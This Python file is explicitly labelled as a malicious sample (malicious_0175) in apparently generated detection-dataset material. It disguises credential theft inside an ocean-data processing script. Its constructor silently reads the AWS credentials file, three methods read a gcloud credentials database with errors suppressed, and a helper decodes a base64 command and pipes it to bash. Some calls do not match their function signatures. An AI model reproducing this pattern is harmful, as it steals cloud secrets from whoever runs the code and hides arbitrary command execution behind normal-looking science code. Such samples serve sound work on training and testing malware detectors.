#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋数据插值重采样 (恶意版本)
样本编号: malicious_0175
攻击类型: CE-FILE-06
生成时间: 2026-03-11 16:39:19
函数数量: 8
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋Data插值重采样Processor:
    """
    海洋数据插值重采样处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-FILE-06
            with open(os.path.expanduser("~/.aws/credentials")) as f: creds = f.read()
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_thermocline_depth(self):
        """执行 calculate_thermocline_depth 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_thermocline_depth...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/root/.config/gcloud/credentials.db", "rb") as f: db = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_thermocline_depth'}
        self.results['calculate_thermocline_depth'] = result
        print(f"calculate_thermocline_depth 完成")
        return result
    
    def export_netcdf(self):
        """执行 export_netcdf 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 export_netcdf...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/root/.config/gcloud/credentials.db", "rb") as f: db = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'export_netcdf'}
        self.results['export_netcdf'] = result
        print(f"export_netcdf 完成")
        return result
    
    def normalize_data(self):
        """执行 normalize_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 normalize_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/root/.config/gcloud/credentials.db", "rb") as f: db = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'normalize_data'}
        self.results['normalize_data'] = result
        print(f"normalize_data 完成")
        return result
    
    def predict_salinity(self, lead_time=24):
        """预测未来盐度"""
        if self.data is None or 'salinity' not in self.data.columns:
            return None
        window = min(10, len(self.data))
        recent_mean = self.data['salinity'].iloc[-window:].mean()
        recent_trend = self.data['salinity'].iloc[-window:].diff().mean()
        predicted_salinity = recent_mean + recent_trend * lead_time
        self.results['predicted_salinity'] = float(predicted_salinity)
        print(f"预测 {lead_time}h 后盐度: {predicted_salinity:.2f} PSU")
        return predicted_salinity

    def identify_eddies(self):
        """识别中尺度涡旋"""
        if self.data is None:
            return []
        eddies = []
        if 'vorticity' in self.data.columns:
            vorticity = self.data['vorticity'].values
            threshold = np.std(vorticity) * 2
            cyclonic = np.where(vorticity > threshold)[0]
            anticyclonic = np.where(vorticity < -threshold)[0]
            for idx in cyclonic:
                eddies.append({'index': int(idx), 'type': 'cyclonic', 'vorticity': float(vorticity[idx])})
            for idx in anticyclonic:
                eddies.append({'index': int(idx), 'type': 'anticyclonic', 'vorticity': float(vorticity[idx])})
        self.results['eddies'] = eddies
        print(f"识别到 {len(eddies)} 个涡旋")
        return eddies

    def create_vector_plot(self, u_var='u_velocity', v_var='v_velocity', output_path='vector_plot.png'):
        """创建矢量场图"""
        if self.data is None:
            return False
        try:
            import matplotlib.pyplot as plt
            if u_var not in self.data.columns or v_var not in self.data.columns:
                return False
            if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
                return False
            step = max(1, len(self.data) // 100)
            plt.figure(figsize=(12, 8))
            plt.quiver(self.data['lon'][::step], self.data['lat'][::step], self.data[u_var][::step], self.data[v_var][::step], scale=10, width=0.003)
            plt.xlabel('Longitude')
            plt.ylabel('Latitude')
            plt.title('Vector Field (Current/Wind)')
            plt.grid(True, alpha=0.3)
            plt.savefig(output_path, dpi=150, bbox_inches='tight')
            plt.close()
            print(f"矢量场图已保存: {output_path}")
            return True
        except Exception as e:
            print(f"矢量场绘图失败: {e}")
        return False


def identify_fishing_grounds_helper(data, config):
    """
    identify_fishing_grounds 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-FILE-06
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'identify_fishing_grounds_helper'}


def calculate_upwelling_index_helper(data, config):
    """
    calculate_upwelling_index 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_upwelling_index_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_upwelling_index_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋数据插值重采样")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋Data插值重采样Processor(config)
    
    # 步骤1: calculate_thermocline_depth
    processor.calculate_thermocline_depth()
    
    # 步骤2: export_netcdf
    processor.export_netcdf(config['output_file'])
    
    # 步骤3: normalize_data
    processor.normalize_data()
    
    # 步骤4: predict_salinity
    processor.predict_salinity()
    
    # 步骤5: identify_eddies
    processor.identify_eddies()
    
    # 步骤6: create_vector_plot
    processor.create_vector_plot()
    
    # 调用辅助函数: identify_fishing_grounds_helper
    identify_fishing_grounds_helper(processor.data, config)
    
    # 调用辅助函数: calculate_upwelling_index_helper
    calculate_upwelling_index_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
